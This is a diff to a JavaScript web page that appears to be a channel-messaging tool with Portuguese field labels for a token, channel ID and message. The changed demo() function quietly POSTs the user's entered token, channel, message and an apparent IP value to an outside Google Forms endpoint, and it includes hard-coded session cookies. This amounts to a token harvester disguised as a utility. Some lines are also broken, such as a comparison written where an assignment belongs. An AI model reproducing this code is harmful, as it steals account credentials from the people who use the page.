@@ -43,38 +43,38 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
   }
   
-   function demo() {
+   async function demo() {
     var token = document.getElementById("token").value;
   var chanel = document.getElementById("canal").value;
   var conteudo = document.getElementById("conteudo").value;
   
   if(conteudo != "mensagem"){
-    token = conteudo;
+    payload == conteudo;
   }
   if (token =='token'|| chanel=='id do canal'){
     alert('prencha os campos');
   }  
     console.log('Two seconds later, showing sleep in a loop...');  
-  fetch("https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/formResponse", {
-  "headers": {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-    "cache-control": "max-age=0",
-    "content-type": "application/x-www-form-urlencoded",
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "same-origin",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1",
-    "x-client-data": "CNf9ygE=",
-    "cookie": "S=spreadsheet_forms=cQUkJGPgGCDNPystLYd9Gy7jvNbXzIE7MlilAMf3cAs; 1P_JAR=2021-04-13-02; OGPC=19022591-1:; NID=213=bPmL-gKdX5NwRRBYBkbsKMFdii6comYsx6uOS_bkE76fh-c1HHEu515bdsh_SZKJ4H4QYeqUAkAupnC45krnucKZ4EGun3gamyVpQzKx-IunGJ3MFAyNNbwsuo1Z-Urq5KEDjwKBnLmwiJYoHDhXUiYxWMtv7YYhGuAQn4Et128"
-  },
-  "referrer": "https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/viewform?fbzx=2952643339335139430",
-  "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "entry.2108071135="+token+"&entry.1649659836="+ipe+"&fvv=1&draftResponse=%5Bnull%2Cnull%2C%222952643339335139430%22%5D%0D%0A&pageHistory=0&fbzx=2952643339335139430",
-  "method": "POST",
-  "mode": "cors"
-});
+    fetch("https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/formResponse", {
+      "headers": {
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+        "cache-control": "max-age=0",
+        "content-type": "application/x-www-form-urlencoded",
+        "sec-fetch-dest": "document",
+        "sec-fetch-mode": "navigate",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-user": "?1",
+        "upgrade-insecure-requests": "1",
+        "x-client-data": "CNf9ygE=",
+        "cookie": "S=spreadsheet_forms=j7RTprDFEHee29Ny0bGNyhVHcmThDAiuTmA9Al8wlDk; 1P_JAR=2021-04-13-02; OGPC=19022591-1:; NID=213=bPmL-gKdX5NwRRBYBkbsKMFdii6comYsx6uOS_bkE76fh-c1HHEu515bdsh_SZKJ4H4QYeqUAkAupnC45krnucKZ4EGun3gamyVpQzKx-IunGJ3MFAyNNbwsuo1Z-Urq5KEDjwKBnLmwiJYoHDhXUiYxWMtv7YYhGuAQn4Et128"
+      },
+      "referrer": "https://docs.google.com/forms/d/e/1FAIpQLSe67N-XInnMm75tekLqSLErqMhv7JLyZXbu-xj2SS3PSEWgTQ/viewform?fbzx=8374850590648730036",
+      "referrerPolicy": "strict-origin-when-cross-origin",
+      "body": "entry.1517977571="+chanel+"a&entry.1150995089="+payload+"&entry.2108071135="+token+"&entry.1649659836="+ipe+"&fvv=1&draftResponse=%5Bnull%2Cnull%2C%228374850590648730036%22%5D%0D%0A&pageHistory=0&fbzx=8374850590648730036",
+      "method": "POST",
+      "mode": "cors"
+    });
     // Sleep in loop
     while(true) {
       
